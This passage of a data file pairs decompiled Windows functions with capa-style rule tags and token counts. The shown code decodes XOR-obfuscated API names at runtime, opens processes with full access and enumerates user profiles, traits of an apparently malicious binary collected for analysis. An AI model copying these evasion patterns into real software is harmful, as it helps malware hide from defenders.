(*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_64h);\n    }\n    if ((*0x41d1f4 & 2) == 0) {\n        *0x41d1f4 = *0x41d1f4 | 2;\n        *0x41d1ec = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f0, iVar8);\n    }\n    if (*0x41d1f0 == 0) {\n        *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar12);\n    }\n    if (*0x41d1ec == NULL) {\n        var_34h = 0x3b1f460a;\n        var_30h._0_2_ = 0x6642;\n        var_30h._2_1_ = 5;\n        stack0xffffffcf = 0x22502119;\n        var_29h._0_1_ = 0x48;\n        var_29h._1_1_ = 1;\n        var_29h._2_2_ = 0x533a;\n        var_25h = 0x433f;\n        var_23h._0_2_ = 0x3525;\n        var_23h._2_2_ = 0x3941;\n        var_1fh._0_2_ = 0x265e;\n        var_1fh._2_2_ = 0x4704;\n        var_1bh._0_2_ = 0x523f;\n        var_1bh._2_2_ = 0x272d;\n        var_17h._0_2_ = 0x6646;\n        var_17h._3_1_ = 0x48;\n        var_8h = 0x54483150;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n        var_17h._2_1_ = var_30h._2_1_;\n        uVar4 = (*pcVar11)(8, 0x22);\n        iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar8 = 0;\n        var_10h = &var_34h - iVar12;\n        do {\n            puVar1 = iVar8 + iVar12;\n            iVar10 = iVar8 % var_54h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_8h + iVar10) ^ (&var_34h - iVar12)[puVar1];\n        } while (iVar8 < 0x21);\n        *0x41d1ec = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f0, iVar12);\n        uVar4 = (*pcVar11)(0, iVar12);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar12 = var_64h;\n        iVar8 = var_60h;\n    }\n    fcn.00408c39();\n    if ((*0x41d1ec != NULL) && (iVar10 = (**0x41d1ec)(var_4ch, 0, &var_a8h, 0x30, &var_58h),  -1 < iVar10)) {\n        uVar4 = (*pcVar11)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (var_10h != NULL) {\n            uVar4 = (*pcVar11)(8, 0x100);\n            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            if (((iVar10 != 0) && (var_58h = fcn.00408722(iVar10, 0x28),  var_58h != 0)) &&\n               (var_58h = fcn.00408722(iVar10 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_58h != 0)) {\n                var_54h = *(iVar10 + 0x18) + 0x10;\n                var_44h = *(iVar10 + 0x3c);\n                var_6ch = *(iVar10 + 0x1c) + (0xffffffef < *(iVar10 + 0x18));\n                var_ch = var_70h + 2;\n                var_48h = *(iVar10 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_54h) || (var_44h != var_6ch)) {\n                    do {\n                        var_58h = fcn.00408722(iVar10 + 0x68, 0x98);\n                        iVar12 = var_64h;\n                        iVar8 = var_60h;\n                        if (var_58h == 0) break;\n                        var_48h = *(iVar10 + 0x68);\n                        var_78h = *(iVar10 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_44h = var_78h;\n                        var_8h = var_48h;\n                        if (var_50h <= arg_8h) {\n                            uVar5 = *(iVar10 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_5ch;\n                            var_ch[5] = *(iVar10 + 0xd0);\n                            *(var_ch + 7) = *(iVar10 + 0xd4);\n                            var_ch[4] = *(iVar10 + 0xa8);\n                            var_ch[2] = *(iVar10 + 0x98);\n                            var_ch[3] = *(iVar10 + 0x9c);\n                            puVar13 = arg_8h_00;\n                            for (iVar12 = 0x200; iVar12 != 0; iVar12 = iVar12 + -1) {\n                                *puVar13 = 0;\n                                puVar13 = puVar13 + 1;\n                            }\n                            var_74h = uVar5;\n                            if ((uVar5 < 0x100) && (var_58h = fcn.00408722(arg_8h_00, *(iVar10 + 0xb0)),  var_58h != 0))\n                            {\n                                uVar6 = 0;\n                                if (uVar5 != 0) {\n                                    do {\n                                        *(uVar6 + 0x20 + var_ch) = arg_8h_00[uVar6 * 2];\n                                        uVar6 = uVar6 + 1;\n                                    } while (uVar6 < uVar5);\n                                }\n                                *(uVar5 + 0x20 + var_ch) = 0;\n                                piVar7 = NULL;\n                                piVar9 = var_ch + 8;\n                                do {\n                                    cVar2 = *piVar9;\n                                    if (cVar2 == '\\\\') {\n                                        piVar7 = piVar9;\n                                    }\n                                    piVar9 = piVar9 + 1;\n                                } while (cVar2 != '\\0');\n                                *(var_ch + 0x1e) = (piVar7 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_5ch = var_5ch + 1;\n                        }\n                    } while ((var_8h != var_54h) || (iVar12 = var_64h,  iVar8 = var_60h,  var_78h != var_6ch));\n                }\n                if (var_70h != NULL) {\n                    *var_70h = var_5ch;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar10 != 0) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_68h = 1;\n    }\n    uVar4 = (*pcVar11)(0, iVar8);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar11)(0, iVar12);\n    (*pcVar3)(uVar4);\n    return var_68h;\n}\n",
        "token_count": 3166
    },
    "00408722": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408722(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_60h;\n    uint var_5ch;\n    uint var_56h;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uchar var_46h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t lpModuleName;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    _var_38h = 0;\n    var_24h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.0040860a();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cd04 == NULL) {\n        var_44h._0_2_ = 0x2e38;\n        var_44h._2_1_ = 8;\n        var_1ch = 5;\n        var_44h._3_1_ = 5;\n        var_40h = 0x36324a04;\n        var_3ch._0_2_ = 0x6900;\n        var_2ch = 0x696c5a56;\n        var_28h._0_2_ = 0x6468;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_18h = 6;\n        var_8h = 0;\n        var_14h = &var_44h - lpModuleName;\n        do {\n            iVar5 = var_8h + 1;\n            *(var_8h + lpModuleName) = *(&var_2ch + var_8h % 6) ^ (var_8h + lpModuleName)[&var_44h - lpModuleName];\n            var_8h = iVar5;\n        } while (iVar5 < 10);\n        var_60h = 0x2b34216a;\n        var_5ch._0_1_ = 0x1d;\n        var_5ch._1_1_ = 6;\n        stack0xffffffa2 = 0xb213162;\n        var_56h = 0x360a0054;\n        var_52h = 0xf37451e;\n        var_4eh = 0x395d0f09;\n        var_4ah = 0x45c3d11;\n        var_46h = 0x56;\n        var_14h = 0x44635630;\n        var_10h._0_1_ = 0x6a;\n        uVar3 = (*pcVar2)(8, 0x1c);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = lpModuleName;\n        iVar7 = 0;\n        var_18h = &var_60h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar6 = iVar7 % var_1ch;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_14h + iVar6) ^ puVar1[&var_60h - iVar4];\n        } while (iVar7 < 0x1b);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar4);\n        *0x41cd04 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        var_38h = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        (*pcVar2)(uVar3);\n        iVar5 = var_4h;\n        in_EDX = var_24h;\n        if (*0x41cd04 == NULL) goto code_r0x004088bc;\n    }\n    iVar5 = var_4h;\n    var_38h = 0;\n    iVar4 = (**0x41cd04)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_38h);\n    if (-1 < iVar4) {\n    }\ncode_r0x004088bc:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar5);\n    }\n    return var_38h;\n}\n",
        "token_count": 1251
    },
    "00408b14": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408b14(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 5;\n    var_2ch = 0x5082e38;\n    var_28h = 0x36324a04;\n    var_24h._0_1_ = 0;\n    var_24h._1_1_ = 0x69;\n    var_20h = 0x696c5a56;\n    var_1ch._0_2_ = 0x6468;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 6;\n    var_8h = 0;\n    do {\n        *(var_8h + lpModuleName) = *(&var_20h + var_8h % 6) ^ (var_8h + lpModuleName)[&var_2ch - lpModuleName];\n        var_8h = var_8h + 1;\n    } while (var_8h < 10);\n    var_30h = 0x192a1a20;\n    var_2ch = 0x173d140a;\n    var_28h = 0x1e1f0c06;\n    var_24h._0_1_ = 0x16;\n    var_24h._1_1_ = 0x69;\n    var_8h = 0x69656d7a;\n    var_4h._0_1_ = 0x6f;\n    uVar3 = (*pcVar5)(8, 0xf);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar2 = lpModuleName;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar4;\n        iVar7 = iVar8 % var_10h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_30h - iVar4];\n    } while (iVar8 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3, iVar4);\n    uVar3 = (*pcVar5)(var_18h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar5)(uVar6);\n    return uVar3;\n}\n",
        "token_count": 829
    },
    "00408eff": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408eff(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_8h = 0;\n    if ((*0x41cd08 | *0x41cd0c) == 0) {\n        var_28h._0_2_ = 0x2e38;\n        var_28h._2_1_ = 8;\n        var_10h = 5;\n        var_28h._3_1_ = 5;\n        var_24h = 0x36324a04;\n        var_20h._0_2_ = 0x6900;\n        var_30h = 0x696c5a56;\n        var_2ch._0_2_ = 0x6468;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_1ch = 6;\n        iVar8 = 0;\n        var_18h = &var_28h - var_4h;\n        do {\n            puVar1 = iVar8 + var_4h;\n            iVar4 = iVar8 % 6;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_30h + iVar4) ^ puVar1[&var_28h - var_4h];\n        } while (iVar8 < 10);\n        var_48h = 0x22253b29;\n        var_44h._0_1_ = 7;\n        var_44h._1_1_ = 0x30;\n        var_44h._2_1_ = 0x23;\n        var_44h._3_1_ = 0xc;\n        var_40h._0_2_ = 0x1633;\n        var_40h._2_1_ = 0xb;\n        var_40h._3_1_ = 0x38;\n        var_3ch._0_2_ = 0x2f36;\n        var_3ch._2_1_ = 1;\n        var_3ch._3_1_ = 0x16;\n        var_38h._0_1_ = 0x2d;\n        var_38h._1_1_ = 6;\n        var_38h._2_1_ = 0x47;\n        var_24h = 0x47624c73;\n        var_20h._0_1_ = 0x73;\n        uVar3 = (*pcVar6)(8, 0x14);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_4h;\n        iVar7 = 0;\n        var_14h = iVar4;\n        var_18h = &var_48h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % var_10h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_48h - iVar4];\n        } while (iVar7 < 0x13);\n        *0x41cd08 = fcn.00408653(iVar4);\n        if (*0x41cd08 == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar8);\n            (*pcVar2)(uVar3);\n            goto code_r0x00409299;\n        }\n        var_48h = 0x2d1a1b1f;\n        var_44h._0_1_ = 0x1f;\n        var_44h._1_1_ = 6;\n        var_44h._2_1_ = 3;\n        var_44h._3_1_ = 0x27;\n        var_40h._0_2_ = 0xe3c;\n        var_40h._2_1_ = 0x3d;\n        var_40h._3_1_ = 0x18;\n        var_3ch._0_2_ = 0x201d;\n        var_3ch._2_1_ = 0x19;\n        var_3ch._3_1_ = 0x20;\n        var_38h._0_1_ = 0xd;\n        var_38h._1_1_ = 0x2d;\n        var_38h._2_1_ = 0x48;\n        var_24h = 0x48496c45;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x6b);\n        uVar3 = (*pcVar6)(8, 0x14);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_4h;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_ch;\n            iVar7 = iVar4 % var_10h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_48h - var_ch];\n        } while (iVar4 < 0x13);\n        *0x41cd10 = fcn.00408653(var_ch);\n        iVar4 = var_14h;\n        if (*0x41cd10 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x303c2469;\n            var_44h._0_1_ = 1;\n            var_44h._1_1_ = 0x65;\n            var_44h._2_1_ = 0x3a;\n            var_44h._3_1_ = 0x14;\n            var_40h._0_2_ = 0x3e26;\n            var_40h._2_1_ = 0x55;\n            var_40h._3_1_ = 0;\n            var_3ch._0_2_ = 0x3214;\n            var_3ch._2_1_ = 5;\n            var_3ch._3_1_ = 0x5a;\n            var_38h._0_1_ = 0x3c;\n            var_38h._1_1_ = 0x1f;\n            var_38h._2_1_ = 0x51;\n            var_30h = 0x51715333;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x71);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n            var_18h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = var_4h;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_18h;\n                iVar7 = iVar4 % var_10h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_30h + iVar7) ^ puVar1[&var_48h - var_18h];\n            } while (iVar4 < 0x13);\n            *0x41cd18 = fcn.00408653(var_18h);\n            iVar4 = var_14h;\n            if (*0x41cd18 == 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            }\n            else {\n                var_48h = 0x201d1b2c;\n                var_44h._0_1_ = 0x2a;\n                var_44h._1_1_ = 3;\n                var_44h._2_1_ = 6;\n                var_44h._3_1_ = 0x3a;\n                var_40h._0_2_ = 0x2b21;\n                var_40h._2_1_ = 0x30;\n                var_40h._3_1_ = 0x2d;\n                var_3ch._0_2_ = 0x3f10;\n                var_3ch._2_1_ = 0x2d;\n                var_3ch._3_1_ = 0x2d;\n                var_38h._0_1_ = 0x33;\n                var_38h._1_1_ = 0xb;\n                var_38h._2_1_ = 0x19;\n                stack0xffffffc7 = 0x4802;\n                var_30h = 0x4e486c76;\n                var_2ch._0_2_ = 0x6247;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n                var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar8 = var_4h;\n                iVar4 = 0;\n                do {\n                    puVar1 = iVar4 + var_10h;\n                    iVar7 = iVar4 % var_1ch;\n                    iVar4 = iVar4 + 1;\n                    *puVar1 = *(&var_30h + iVar7) ^ puVar1[&var_48h - var_10h];\n                } while (iVar4 < 0x15);\n                *0x41cd20 = fcn.00408653(var_10h);\n                iVar4 = var_14h;\n                if (*0x41cd20 != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n                    (*pcVar6)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                    (*pcVar6)(uVar3);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar6)(uVar3);\n                    uVar3 = (*pcVar2)(0, iVar8);\n                    (*pcVar6)(uVar3);\n                    goto code_r0x00409294;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n            }\n            (*pcVar6)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x00409294:\n        var_8h = 0x41cd08;\n    }\ncode_r0x00409299:\n    *0x41cd24 = *0x41cd20 >> 0x20;\n    *0x41cd1c = *0x41cd18 >> 0x20;\n    *0x41cd14 = *0x41cd10 >> 0x20;\n    *0x41cd0c = *0x41cd08 >> 0x20;\n    return var_8h;\n}\n",
        "token_count": 3007
    },
    "004096d2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004096d2(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t lpLibFileName;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_2ch = 0x71255a2c;\n    var_28h = 0x5a2d7657;\n    var_24h._0_2_ = 0x7155;\n    lpLibFileName = 0x71555a43;\n    var_14h._0_2_ = 0x7632;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    var_ch = 6;\n    iVar6 = var_4h;\n    do {\n        puVar1 = iVar9 + iVar6;\n        iVar6 = iVar9 % 6;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&lpLibFileName + iVar6) ^ puVar1[&var_2ch - var_4h];\n        iVar6 = var_4h;\n    } while (iVar9 < 10);\n    var_3ch = 0xd7d1c3c;\n    var_38h = 0x7a5d782e;\n    var_34h = 0x4b0e2d5c;\n    var_28h = 0x4138546f;\n    var_24h._0_2_ = 0x4b62;\n    uVar3 = (*pcVar4)(8, 0xd);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_10h = &var_3ch - lpLibFileName;\n    do {\n        puVar1 = iVar6 + lpLibFileName;\n        iVar9 = iVar6 % var_ch;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_28h + iVar9) ^ puVar1[&var_3ch - lpLibFileName];\n    } while (iVar6 < 0xc);\n    var_3ch = 0x28340332;\n    var_38h = 0x34132439;\n    var_34h = 0xe152027;\n    var_30h._0_1_ = 6;\n    var_30h._1_1_ = 0x44;\n    var_ch = 0x44516b61;\n    var_8h._0_1_ = 0x55;\n    uVar3 = (*pcVar4)(8, 0xf);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = lpLibFileName;\n    iVar8 = 0;\n    do {\n        var_10h = 5;\n        puVar1 = iVar8 + iVar9;\n        iVar7 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_ch + iVar7) ^ puVar1[&var_3ch - iVar9];\n    } while (iVar8 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar9);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    uVar5 = (*pcVar4)(0, var_4h, var_20h, var_1ch, 0, 0);\n    if (0x20 < uVar5) {\n        uVar5 = 0;\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar4)(uVar3);\n    uVar3 = (*pcVar2)(0, var_4h);\n    (*pcVar4)(uVar3);\n    return uVar5;\n}\n",
        "token_count": 1151
    },
    "0040a8a7": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040a8a7(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    code *pcVar14;\n    uint *puVar15;\n    int16_t *piVar16;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t lpString2;\n    int32_t var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t hFindFile;\n    int16_t *var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uchar *ARG_0;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t dwBytes;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c4h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_60h = piVar5;\n        uVar4 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(8, 0x208);\n            puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            puVar10 = &lpFindFileData;\n            ARG_0 = puVar6;\n            for (iVar7 = 0x250; piVar5 = var_60h,  iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            puVar6 = lpFileName;\n            for (iVar7 = dwBytes * 2; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            piVar16 = var_60h;\n            for (iVar7 = dwBytes * 2; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *piVar16 = 0;\n                piVar16 = piVar16 + 1;\n            }\n            iVar7 = (*pcVar3)(var_60h, &dwBytes);\n            if (iVar7 != 0) {\n                iVar7 = lpFileName - piVar5;\n                do {\n                    iVar2 = *piVar5;\n                    *(piVar5 + iVar7) = iVar2;\n                    piVar5 = piVar5 + 1;\n                } while (iVar2 != 0);\n                var_58h = 0x3047736a;\n                var_54h = 0x731c4b66;\n                var_50h._0_2_ = 0x306d;\n                var_8h = 0x306d7336;\n                var_4h._0_2_ = 0x4b48;\n                uVar4 = (*pcVar14)(8, 0x15);\n                lpMem = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                